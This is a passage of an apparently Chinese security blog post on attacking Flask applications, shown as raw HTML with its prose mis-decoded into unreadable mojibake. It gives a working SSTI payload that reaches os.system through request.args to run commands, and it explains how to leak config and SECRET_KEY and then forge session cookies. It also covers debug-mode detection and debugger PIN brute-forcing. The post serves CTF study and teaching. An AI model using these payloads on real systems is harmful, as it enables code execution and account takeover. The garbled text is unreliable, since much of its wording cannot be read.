class="hljs-string">&quot;hmac&quot;</span>&#125;<br>).dumps(&#123;<span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>&#125;)<br></code></pre></td></tr></table></figure></p>
<p>æ¥è¯•è¯•ä¼ªé€ çš„ sessionï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/34481fa5-aac1-4f59-acde-5809ed60d1ca.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>nice.</p>
<p>å¤§å®¶ä¼¼ä¹éƒ½å¾ˆå–œæ¬¢ç”¨ <code>flask-session-cookie-manager</code> ï¼ˆè§èµ„æ–™ 3ï¼‰ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“å®ƒå’Œ <code>itsdangerous.URLSafeTimedSerializer</code> çš„åŒºåˆ«æ˜¯å•¥...è¿™ä¸ªç±»æ—¢å¯ä»¥è§£å¼€ä¹Ÿå¯ä»¥ä¼ªé€ ã€‚éš¾é“æ˜¯æ²¡æœ‰å‹ç¼©åŠŸèƒ½ï¼Ÿä½†æ˜¯ä¼ªé€ çš„æ—¶å€™ä¹Ÿä¸éœ€è¦å‹ç¼©å‘€ï¼Ÿ</p>
<p>æœ€åæ•™å¤§å®¶ä¸€ä¸ªå¿«é€Ÿè°ƒè¯•çš„æ–¹å¼ã€‚</p>
<p>æˆ‘ä»¬å¹³æ—¶å†™ä¸€äº›å°è„šæœ¬éƒ½éœ€è¦æç‚¹æµ‹è¯•ç”¨ä¾‹æ¥æµ‹è¯•ï¼Œé‚£åƒ flask è¿™ç§ Web åº”ç”¨ï¼Œå¦‚æœæ¯æ¬¡ä¿®æ”¹ä»£ç éƒ½éœ€è¦é‡å¯æœåŠ¡ï¼Œå†é€šè¿‡ HTTP åè®®æ¥æµ‹è¯•ï¼Œé‚£å®åœ¨æ˜¯å¤ªæ…¢äº†ã€‚å¯¹äºæˆ‘ä»¬å®‰å…¨æ¥è¯´ï¼Œä¸€æ ·éœ€è¦æµ‹è¯•å„ç§ payloadã€‚ç”±äºå®‰å…¨ä¸€èˆ¬åªéœ€è¦ç®€å•çš„æµ‹è¯•ï¼Œæ‰€ä»¥ä¸éœ€è¦ç”¨æ¯”è¾ƒé‡çš„æµ‹è¯•æ¡†æ¶ä¾‹å¦‚ pytest ä¹‹ç±»çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ç›´æ¥ç”¨ <code>Flask.test_client</code> å°±å¯ä»¥æ¨¡æ‹Ÿè¯·æ±‚äº†ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template_string, request<br><br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    user = request.args.get(<span class="hljs-string">&quot;user&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">f&#x27;&#123;&#123;% autoescape false %&#125;&#125;Welcome, <span class="hljs-subst">&#123;user&#125;</span>!&#123;&#123;%endautoescape%&#125;&#125;&#x27;</span>)<br><br><br>app.test_client().get(<span class="hljs-string">&#x27;/&#x27;</span>, query_string=&#123;<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;&#123;&#123; 1+1 &#125;&#125;&quot;</span>&#125;).get_data(as_text=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
<p><code>test_client</code> ä¸‹æ–¹æ³•çš„å±æ€§åˆ—è¡¨å¯ä»¥åœ¨ <code>site-packages/werkzeug/test.py</code> é‡Œçš„ <code>class EnvironBuilder:</code> ä¸‹çš„æ³¨é‡Šä¸­æ‰¾åˆ°ã€‚</p>
<h3 id="flask-çš„-ssti">flask çš„ SSTI</h3>
<p>è¿™ä¸€èŠ‚æœ¬æ¥æ˜¯æ”¾åœ¨ã€ŠSecMap - SSTIï¼ˆjinja2ï¼‰ã€‹ï¼ˆè§èµ„æ–™ 4ï¼‰ä¸­ä»‹ç»çš„ï¼Œä½†æ˜¯ä¸ºäº†æŸ¥è¯¢çš„ä¾¿åˆ©æ€§ï¼Œå°±æ”¾åœ¨è¿™é‡Œå¥½äº†ï¼Œjinja2 é‚£ç¯‡æ–‡ç« ä¸­ä¼šå¼•ç”¨è¿™é‡Œçš„çŸ¥è¯†ç‚¹ã€‚</p>
<p>flask æœ€å¸¸è§çš„æ­æ¡£å°±æ˜¯ jinja2 äº†ã€‚ç”±äº flask ä¼šå¼•å…¥æ–°çš„å˜é‡ï¼Œæ‰€ä»¥ä¹Ÿä¼šå¼•å…¥æ–°çš„å§¿åŠ¿ã€‚ä»å®˜æ–¹æ–‡æ¡£å¯ä»¥çœ‹åˆ°å®˜æ–¹å¼•å…¥çš„æ–°çš„å…¨å±€å˜é‡ï¼ˆè§èµ„æ–™ 5ï¼‰</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/933c3335-74cc-490f-bfc5-7383445de6b6.png!blog#width-zoom7" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<ul>
<li><code>config</code>ï¼šå½“å‰é…ç½®å¯¹è±¡ï¼ŒåŸå‹ä¸º <code>flask.Flask().config</code></li>
<li><code>request</code>ï¼šå½“å‰ request å¯¹ä¸‹ï¼ŒåŸå‹ä¸º <code>flask.request</code>ã€‚æ³¨ï¼šå¦‚æœæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ request context æ²¡æœ‰æ¿€æ´»ï¼Œè¿™ä¸ªå˜é‡æ˜¯æ²¡æ³•åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨çš„</li>
<li><code>session</code>ï¼šå½“å‰ session å¯¹è±¡ï¼ŒåŸå‹æ˜¯ <code>flask.session</code>ã€‚æ³¨ï¼šå¦‚æœæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ request context æ²¡æœ‰æ¿€æ´»ï¼Œè¿™ä¸ªå˜é‡æ˜¯æ²¡æ³•åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨çš„</li>
<li><code>g</code>ï¼šå…¨å±€å˜é‡çš„ request-bound å¯¹è±¡ï¼ŒåŸå‹æ˜¯ <code>flask.g</code>ã€‚æ³¨ï¼šå¦‚æœæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ request context æ²¡æœ‰æ¿€æ´»ï¼Œè¿™ä¸ªå˜é‡æ˜¯æ²¡æ³•åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨çš„</li>
<li><code>url_for()</code>ï¼ŒåŸå‹æ˜¯ <code>flask.url_for()</code></li>
<li><code>get_flashed_messages()</code>ï¼šåŸå‹æ˜¯ <code>flask.get_flashed_messages()</code></li>
</ul>
<h4 id="é€šç”¨ç»•è¿‡å§¿åŠ¿">é€šç”¨ç»•è¿‡å§¿åŠ¿</h4>
<p>å¸¸è§„çš„é€šç”¨ç»•è¿‡å§¿åŠ¿å°±ä¸é‡å¤è¯´äº†ï¼Œã€ŠSecMap - SSTIï¼ˆjinja2ï¼‰ã€‹ é‡Œè¯´çš„å¾ˆå…¨ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œflask çš„ <code>request</code> ä¸­åŒ…å«äº†å¤§é‡è¯·æ±‚ç›¸å…³çš„å±æ€§ï¼ˆè§èµ„æ–™ 6ï¼‰ï¼Œå¯ä»¥ç”¨äº bypass ä¸€äº›éå¸¸ä¸¥æ ¼çš„é™åˆ¶ã€‚</p>
<ol type="1">
<li><code>request.args</code>ï¼šGET è¯·æ±‚çš„å‚æ•°</li>
<li><code>request.form</code>ï¼šPOST å‚æ•°</li>
<li><code>request.values</code>ï¼šPOST å’Œ GET çš„å‚æ•°</li>
<li><code>request.cookies</code>ï¼šCookies å€¼</li>
<li><code>request.files</code>ï¼šåŒ…å«äº†ä¸Šä¼ çš„æ–‡ä»¶åå’Œå†…å®¹</li>
<li><code>request.headers</code>ï¼šè¯·æ±‚å¤´</li>
<li>ç›´æ¥è·å–å¤´çš„å±æ€§ï¼Œä¸Šé¢æ–‡æ¡£ä¸­å«æœ‰ <code>entity-header field</code> å…³é”®å­—çš„éƒ½æ˜¯ï¼Œæ¯”å¦‚ï¼š
<ol type="1">
<li><code>request.authorization</code>ï¼šbasic è®¤è¯çš„å‡­æ®</li>
<li><code>request.content_type</code>ï¼š<code>Content-Type</code> HTTP å¤´</li>
<li><code>request.content_md5</code>ï¼š<code>Content-MD5</code> HTTP å¤´</li>
<li><code>request.get_data</code>ï¼šå’Œ <code>request.data</code> ç±»ä¼¼</li>
<li>...</li>
</ol></li>
<li><code>request.full_path</code>ï¼šå®Œæ•´è¯·æ±‚è·¯å¾„ï¼ŒåŒ…å«å‚æ•°</li>
<li><code>request.environ</code>ï¼šWSGI çš„ç¯å¢ƒå˜é‡ï¼ŒåŒ…å« HTTP å¤´ï¼ˆå¯¹åº”çš„é”®ä¼šè‡ªåŠ¨åŠ ä¸Š <code>HTTP_</code> å‰ç¼€ï¼‰ï¼Œè¿˜æœ‰ WSGI æœåŠ¡ç«¯çš„ä¸€äº›ä¿¡æ¯</li>
<li>ä»¥åŠé€šè¿‡ mro æˆ‘ä»¬ä¹Ÿæ˜¯å¯ä»¥é—´æ¥è·å–åˆ°è¿™äº›å±æ€§çš„ã€‚</li>
</ol>
<p>è¿™äº›è¯·æ±‚ç›¸å…³çš„å±æ€§å¯ä»¥ä¼ é€’ä»»ä½•è¢«è¿‡æ»¤çš„å­—ç¬¦ä¸²ã€‚ä¸¾ä¾‹ï¼Œå‡è®¾å‚æ•° user è¿‡æ»¤äº† <code>os</code>ã€<code>system</code>ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä»»æ„æŒ‡å®šå¦å¤–ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ç”¨äºä¼ é€’ <code>os</code>ã€<code>system</code>ã€å‘½ä»¤ï¼Œpayload å¯ä»¥è¿™æ ·ï¼š<br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">?user=&#123;&#123;config.get_namespace.__globals__[request.args.module][request.args.func](request.args.cmd)&#125;&#125;<br>&amp;module=os<br>&amp;func=system<br>&amp;cmd=whoami<br></code></pre></td></tr></table></figure></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/3ce21907-892f-4068-befa-33802ef4de56.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>è¿™ä¸ªå§¿åŠ¿æ˜¯éå¸¸éå¸¸é€šç”¨çš„ã€‚åˆ©ç”¨çš„æ—¶å€™ï¼Œæœ€é‡è¦çš„èµ„æ–™è¿˜æ˜¯å®˜æ–¹æ–‡æ¡£ã€‚</p>
<h4 id="é€šè¿‡-mro-å¯»æ‰¾å¯åˆ©ç”¨æ¨¡å—">é€šè¿‡ mro å¯»æ‰¾å¯åˆ©ç”¨æ¨¡å—</h4>
<p>mro ç›´æ¥åˆ©ç”¨ dibber æœç´¢å°±è¡Œï¼ˆè§èµ„æ–™ 7ï¼‰</p>
<blockquote>
<p>config</p>
</blockquote>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/f704705f-df49-4068-93d2-9e4c660ce06b.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<blockquote>
<p>g</p>
</blockquote>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/9c934cd6-29f1-448c-8295-2957a6a83fc2.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>å…¶ä»–åŒç†ï¼Œå°±ä¸åˆ—ä¸¾äº†ï¼Œæ©˜å‹ä»¬ç”¨ dibber è‡ªè¡Œå°è¯•å³å¯ã€‚</p>
<h4 id="config-ä¿¡æ¯æ³„éœ²">config ä¿¡æ¯æ³„éœ²</h4>
<p>config æ˜¯ flask ä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå®ƒä»£è¡¨å½“å‰é…ç½®å®ä¾‹ï¼ŒåŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒåŒ…å«äº†æ¯”å¦‚æ•°æ®åº“é“¾æ¥å­—ç¬¦ä¸²ï¼Œè¿æ¥åˆ°ç¬¬ä¸‰æ–¹çš„å‡­è¯ï¼ŒSECRET_KEY ç­‰æ•æ„Ÿå€¼ã€‚</p>
<p>æ‰€ä»¥å¦‚æœå¯ä»¥è·å–åˆ° configï¼Œå°±å¯ä»¥ç›´æ¥æ‹¿åˆ°å„ç§æ•æ„Ÿæ•°æ®ã€‚æ¯”å¦‚å¦‚æœéœ€è¦è·å–ç»å¯¹ Web æ ¹ç›®å½•å¯ä»¥ç”¨ <code>config.root_path</code>ï¼›æ¯”å¦‚ä¸Šé¢è¯´çš„ä¼ªé€  session éœ€è¦ secret_keyï¼Œè€Œ config å°±æœ‰ secret_keyã€‚æ‰€ä»¥åªè¦è·å–äº† config å°±å¯ä»¥ä¼ªé€  session äº†ã€‚</p>
<p>å¦‚æœå­˜åœ¨ SSTI é‚£ä¹ˆç›´æ¥ <code>&#123;&#123; config &#125;&#125;</code> å°±å¯ä»¥äº†ã€‚å½“ç„¶ï¼Œå¦‚æœæ²¡æ³•ç›´æ¥æ‹¿ configï¼Œå¯ä»¥ç”¨ mro æ¥æ‰¾å…¶ä»–åˆ©ç”¨é“¾ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li><code>url_for.__globals__['current_app'].config</code></li>
<li><code>get_flashed_messages.__globals__['current_app'].config</code></li>
<li><code>self.__dict__._TemplateReference__context.config</code>ï¼Œè¿™ä¸ªå°±æ˜¯ jinja2 è‡ªå¸¦çš„ï¼Œåœ¨ jinja2 çš„ SSTI ä¸­ä»‹ç»è¿‡äº†</li>
<li>...</li>
</ul>
<p>åŒæ ·ï¼Œç±»ä¼¼çš„æ›¿æ¢æ–¹å¼å†™ä¸ª dibber çš„æ’ä»¶å³å¯è‡ªåŠ¨æœç´¢ã€‚</p>
<p>å®åœ¨ä¸è¡Œï¼Œå…ˆç¡®å®šè„šæœ¬çš„è·¯å¾„ï¼Œå†ç›´æ¥è¯»æºç ä¹Ÿæ˜¯ ok çš„...</p>
<p>ä¸Šé¢æœ‰ä¸ªç»“è®ºï¼Œâ€œåªè¦æ‹¿åˆ°äº† secret_key å°±å¯ä»¥ä¼ªé€  sessionâ€ï¼Œè¿™ä¸ªè¯´æ³•å¹¶ä¸æ˜¯éå¸¸å‡†ç¡®ã€‚å› ä¸ºé€šè¿‡ä¸Šé¢çš„åˆ†æå¯çŸ¥ï¼Œsession çš„ç­¾åè¿˜å–å†³äºä½¿ç”¨çš„å¯†é’¥æ´¾ç”Ÿå‡½æ•°ã€salt å’Œ hash ç®—æ³•ï¼Œè¿™ä¸‰è€…åªè¦æ›¿æ¢æ‰ä¸€ä¸ªï¼Œç”¨ç°æœ‰çš„å·¥å…·å³ä½¿çŸ¥é“ secret_key ä¹Ÿæ˜¯æ²¡æ³•ç”Ÿæˆæœ‰æ•ˆçš„ session çš„ã€‚</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/6e2d5367-8bab-4552-8d61-00a887643a46.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>æ‰€ä»¥è¿™å°±æ˜¯ä¸€ä¸ª ctf çš„å‡ºé¢˜æ€è·¯äº†ï¼š</p>
<ol type="1">
<li>é¢˜ç›®çš„ç›®çš„ï¼šä¼ªé€  root çš„ session</li>
<li>é¢˜ç›®ä¸­å­˜åœ¨ ssti</li>
</ol>
<p>ç”±äºå¯ä»¥ç›´æ¥æ‹¿åˆ° secret_keyï¼Œæ‰€ä»¥ä¼°è®¡å¾ˆå¤šäººç›´æ¥å¼€å§‹ä¼ªé€  sessionï¼Œç„¶åå‘ç° session å°±æ˜¯æ— æ•ˆçš„...</p>
<p>æ‰€ä»¥åœ¨ç”¨ flask çš„æ—¶å€™ï¼Œä¸å¦¨æ¢ä¸€ä¸ª saltï¼Œä¹Ÿæ²¡å•¥æ”¹é€ çš„æˆæœ¬ã€‚</p>
<p>å½“ç„¶ï¼Œå¦‚æœå­˜åœ¨ SSTIï¼Œé‚£ä¹ˆæ˜¯å¯ä»¥éå¸¸è½»æ˜“åœ°è·å–è¿™ä¸‰ä¸ªä¿¡æ¯çš„ï¼š</p>
<ul>
<li><code>config.__init__.__globals__.__builtins__.__import__('flask').sessions.SecureCookieSessionInterface.key_derivation</code></li>
<li><code>config.__init__.__globals__.__builtins__.__import__('flask').sessions.SecureCookieSessionInterface.salt</code></li>
<li><code>config.__init__.__globals__.__builtins__.__import__('flask').sessions.SecureCookieSessionInterface.digest_method</code></li>
</ul>
<p>ç¡®è®¤è¿™ä¸‰ä¸ªå…³é”®çš„ä¿¡æ¯ä¹‹åï¼Œç»“åˆ secret_key å°±å¯ä»¥ä¼ªé€ äº†ã€‚</p>
<h3 id="åˆ©ç”¨-debug-æ¨¡å¼å§¿åŠ¿">åˆ©ç”¨ debug æ¨¡å¼å§¿åŠ¿</h3>
<p>flask è´´å¿ƒåœ°æä¾›äº† debug æ¨¡å¼ï¼Œåªéœ€è¦åŠ å‚æ•° <code>app.run(debug=True)</code> å³å¯ï¼Œç”¨äºåœ¨æµ‹è¯•çš„æ—¶å€™åŠæ—¶å‘ç°å’Œå®šä½é—®é¢˜ã€‚</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/e10d7f9a-f143-44b9-ba91-69d256e74ccf.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>é»‘ç›’åˆ¤æ–­æ˜¯å¦å¼€å¯ debug æ¨¡å¼ï¼Œæœ€ç›´æ¥çš„æ–¹å¼å°±æ˜¯è§¦å‘ä¸€ä¸ªæŠ¥é”™ã€‚é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼š<br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-string">&quot;__debugger__&quot;</span> <span class="hljs-keyword">in</span> requests.get(<br>  <span class="hljs-string">&#x27;http://127.0.0.1:5000/?__debugger__=yes&amp;cmd=resource&amp;f=style.css&#x27;</span><br>).text<br></code></pre></td></tr></table></figure></p>
<p><code>style.css</code> ä½äº <code>site-packages/werkzeug/debug/shared/</code> ä¸‹ï¼Œè¿™é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶éƒ½å¯ä»¥ç”¨æ¥åˆ¤æ–­ã€‚</p>
<p>ä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œè¿™ä¸ªé¡µé¢ä¸­æœ‰å¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ã€‚</p>
<h4 id="ä¿¡æ¯æ³„éœ²">ä¿¡æ¯æ³„éœ²</h4>
<p>è¿™ä¸ªé¡µé¢ä¸­çš„æŠ¥é”™æ‰€åœ¨ä»£ç æ˜¯å¯ä»¥ç‚¹å‡»çš„ï¼Œä¸”æ˜¯æŒ‰ç…§ Python å¼‚å¸¸å †æ ˆé¡ºåºæ’åˆ—ï¼Œæ‰€ä»¥ä¸€èˆ¬æœ€åä¸€è¡Œå°±æ˜¯æŠ¥é”™çš„åŸå§‹ä»£ç ã€‚ç‚¹å‡»ä¹‹åå¯ä»¥çœ‹åˆ° 10 è¡Œæºä»£ç ï¼Œè§¦å‘æŠ¥é”™çš„ä»£ç åœ¨ç¬¬ 6 è¡Œã€‚å¦‚æœæ•æ„Ÿä¿¡æ¯æ­£å¥½åœ¨è¿™ä¸ªèŒƒå›´é‡Œï¼Œé‚£ä¹ˆå°±ä¼šæ³„éœ²å‡ºæ¥ã€‚</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/4035a916-551c-401e-82af-35ba9c29bae1.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>æŒ‰ç…§è¿™ä¸ªæ€è·¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ SSTI çš„æ—¶å€™ï¼Œå‘ç°æ˜¯æ— å›æ˜¾çš„ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥é€šè¿‡è§¦å‘æŠ¥é”™ï¼Œç„¶ååœ¨ debug é‡Œè·å¾—ç»“æœã€‚</p>
<h4 id="åˆ©ç”¨æŠ¥é”™è§£å†³æ— å›æ˜¾">åˆ©ç”¨æŠ¥é”™è§£å†³æ— å›æ˜¾</h4>
<p><code>eval</code> æˆ–è€… <code>exec</code> æˆ‘ä»¬æƒ³çœ‹åˆ°çš„æ•°æ®å³å¯ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/f8424ba9-027e-4b36-91e9-7c83b333abf5.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h4 id="get-pin-get-shell">get PIN, get shell</h4>
<p>åœ¨ debug é¡µé¢ä¸­ç”šè‡³è¿˜æä¾›äº† python çš„äº¤äº’å¼ shellï¼Œæ–¹ä¾¿ plusã€‚</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/4f68d80e-9f35-48e8-b36c-2630db9ae36d.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ä½†å‰ææ˜¯éœ€è¦æœ‰ <code>Debugger PIN</code>ï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/31eb9888-bbcd-4960-81db-6cd12bec694d.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>è¿™ä¸ªåœ¨ debug æ¨¡å¼ä¸‹å¯åŠ¨ flask çš„æ—¶å€™å¯ä»¥ç›´æ¥è·å–åˆ°ï¼ˆé€šå¸¸æ˜¯åœ¨ç»ˆç«¯ç›´æ¥æ‰“å°ï¼‰ã€‚ä½œä¸ºæ”»å‡»è€…ï¼Œæ˜¯æ²¡æ³•ç›´æ¥æ‹¿åˆ°è¿™ä¸ª PIN çš„ã€‚</p>
<blockquote>
<p>çˆ†ç ´ PIN</p>
</blockquote>
<p>æœ€ç›´æ¥çš„åŠæ³•å°±æ˜¯çˆ†ç ´ã€‚å¯æƒœ flask é»˜è®¤å¸¦æœ‰çˆ†ç ´é˜²å¾¡åŠŸèƒ½ï¼Œåœ¨ <code>site-packages/werkzeug/debug/__init__.py</code> ä¸­çš„ <code>pin_auth</code>ï¼š</p>
<ol type="1">
<li>ä¸€æ—¦æ£€æŸ¥ PIN å¤±è´¥å°±ä¼šè°ƒç”¨ <code>_fail_pin_auth</code>ï¼Œè®© <code>self._failed_pin_auth</code> åŠ  1</li>
<li>å¦‚æœ <code>self._failed_pin_auth &gt; 5</code>ï¼Œæ¯æ¬¡è®¤è¯è¿”å›å“åº”å‰å»¶æ—¶ 5s</li>
<li>å¦‚æœ <code>self._failed_pin_auth &gt; 10</code>ï¼Œå¼ºåˆ¶åœæ­¢ PIN æ ¡éªŒé€»è¾‘ï¼Œåªèƒ½é‡å¯æœåŠ¡æ¥é‡ç½®</li>
</ol>
<p>è¿™é‡Œæœ‰ä¸ªç»†èŠ‚ï¼Œç”±äº <code>_fail_pin_auth</code> æ˜¯ sleep ä¹‹åæ‰ +1ï¼Œæ‰€ä»¥ç†è®ºä¸Šåªè¦åœ¨ 5s å†…å‘å‡ºå¾ˆå¤šè¯·æ±‚ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ +1 ä¹‹å‰å°±ç»è¿‡å¾ˆå¤šæ¬¡ PIN éªŒè¯ã€‚é—æ†¾çš„æ˜¯ï¼Œflask PIN ä¸€èˆ¬éƒ½æœ‰ 9 ä½æ•°å­—ï¼Œæ¯ä½æœ‰ 10 ç§å¯èƒ½æ€§ï¼Œä¹Ÿå°±æ˜¯ 10 äº¿ç§å¯èƒ½æ€§ï¼Œä¸€å…±å¯ä»¥å°è¯• 10 æ¬¡ï¼Œå°±ç®—æ¯æ¬¡éƒ½å»¶è¿Ÿ 5sï¼Œé‚£ä¹ˆ 50s å†…éœ€è¦å‘å‡º 10 äº¿æ¬¡å°è¯•ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ã€‚ä¸è¿‡è¿™ä¸ªå¯ä»¥è€—å°½å°è¯•æ¬¡æ•°å¯¼è‡´åˆ«äººä¹Ÿæ— æ³•ä½¿ç”¨ debugï¼Œé‚£ä¹ˆæ˜¾ç„¶è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒé¸¡è‚‹çš„ DoSã€‚</p>
<p>æ‰€ä»¥çˆ†ç ´çš„è·¯å­èµ°ä¸é€šï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾å…¶ä»–æ–¹å¼ã€‚</p>
<p>é€šè¿‡åˆ†æ flask æºç å¯ä»¥æ‹¿åˆ°ä»¥ä¸‹è°ƒç”¨é“¾ï¼Œå¯ä»¥çœ‹å‡º PIN çš„ç”Ÿæˆæ˜¯ç›¸å¯¹å›ºå®šçš„ï¼š</p>
<ol type="1">
<li>å…¥å£ py æ–‡ä»¶ ä¸­çš„ <code>... .run()</code></li>
<li><code>site-packages/flask/app.py</code> ä¸­ï¼Œ<code>class Flask(Scaffold):</code> ä¸‹ <code>run</code> çš„ <code>run_simple(host, port, self, **options)</code></li>
<li><code>site-packages/werkzeug/serving.py</code> ä¸­ï¼Œ<code>run_simple</code> çš„ <code>application = DebuggedApplication(application, use_evalex)</code></li>
<li><code>site-packages/werkzeug/debug/__init__.py</code> ä¸­ï¼Œ<code>class DebuggedApplication:</code> ä¸‹ <code>pin</code> çš„ <code>pin_cookie = get_pin_and_cookie_name(self.app)</code></li>
<li><code>site-packages/werkzeug/debug/__init__.py</code> ä¸­çš„<code>get_pin_and_cookie_name</code></li>
</ol>
<p><code>get_pin_and_cookie_name</code> ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å¯¹ PIN çš„å¤„ç†æœ‰ä¸€äº›ç‰¹æ®Šçš„é€»è¾‘ï¼Œè§ä¸‹é¢ä»£ç æ³¨é‡Šï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 